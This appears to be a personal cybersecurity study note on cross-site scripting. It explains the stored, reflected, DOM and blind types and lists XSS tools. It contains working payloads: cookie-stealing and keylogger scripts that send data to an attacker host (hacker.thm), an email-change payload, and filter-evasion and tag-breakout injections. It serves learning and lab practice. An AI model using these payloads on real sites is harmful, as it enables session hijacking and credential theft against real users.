# XSS - Cross-Site Scripting

[Back to Table of Contents](../cysec)

---


> Injection attack where a malicious payload can be injected into a web page and potentially result in an attacker getting user, staff, or other sensitive data

XSS attacks can be used for a wide-variety of attacks, resulting in anything from stealing cookies to executing arbitrary code on the server.

XSS can be confirmed by trying simple payloads:
~~~
<script>alert('XSS');</script>
~~~
Payload examples can be found at:
[Payload Box - XSS](https://github.com/payloadbox/xss-payload-list)
- PayLoadAllTheThings
- SecLists
- HackTricks

---

### Some examples:
#### Session stealing:
~~~

<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

~~~
#### Key loggger:
~~~

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

~~~

#### Change email:
~~~

<script>user.changeEmail('attacker@hacker.thm');</script>

~~~

---

### Stored XSS

Stored XSS is XSS where a payload is injected into a webpage, and stored at the server level, resulting in that malicious code's presentation to other users of the site. This allows for various serious threats. 

>Attack Vectors:

Comments on a blog

User profile information

Website Listings

---

### Reflected XSS

Reflected XSS, on the other hand, is XSS where the payload is reflected only on the page instance itself. Attackers must send a link to the altered page to a victim to take advantage of reflected XSS, as it is not stored at the server level.

Attack Vectors:

Parameters in the URL Query String

URL File Path 

---
	
### DOM XSS

DOM-based XSS depends on JS code executing locally and not server-side. This allows for an attacker to exploit specific JS function and then, like reflected XSS, send a link with the malicious code injected. Requires a deeper level of JS to exploit. 

Attack Vectors:

eval()

---
	
### Blind XSS

Blind XSS is XSS where malicious code is presented to other users, as in stored XSS, however you are unable to see it. In order for attackers to take advantage of this XSS, an HTML callback is incorporated into the payload.


---

#### Evasion:

~~~
"><script>alert(1);</script>
~~~

Close tag of encapsulating div:

~~~
</textarea><script>alert(1);</script>
~~~

	
Filter evasion:

Filter for 'script' --> sscriptcript

	
~~~
<sscriptcript>alert(1);</sscriptcript>
~~~

	
Within an image:

	
~~~
/images/cat.jpg" onload="alert(1);
~~~

---
	
### Tools:

-XSS is mostly and best, in my experience, done manually -- but some tools exist, with varying degrees of success. 
	
````
- xsshunter

- xsssniper

- xssstealer

- garud

- 0d1n
````
